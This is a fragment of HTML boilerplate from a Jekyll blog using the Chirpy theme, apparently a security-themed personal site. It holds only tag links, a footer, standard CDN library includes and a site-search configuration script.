href="/tags/jekyll/">jekyll</a> <a class="post-tag btn btn-outline-primary" href="/tags/techno-tim/">techno-tim</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><footer><div class="container px-lg-4"><div class="d-flex justify-content-center align-items-center text-muted mx-md-3"><p>Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a></p><p>© 2023 <a href="https://github.com/r0bsec">r0bsec</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div></div></footer><div id="mask"></div><button id="back-to-top" aria-label="back-to-top" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/page.min.js"></script> <script defer src="/app.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
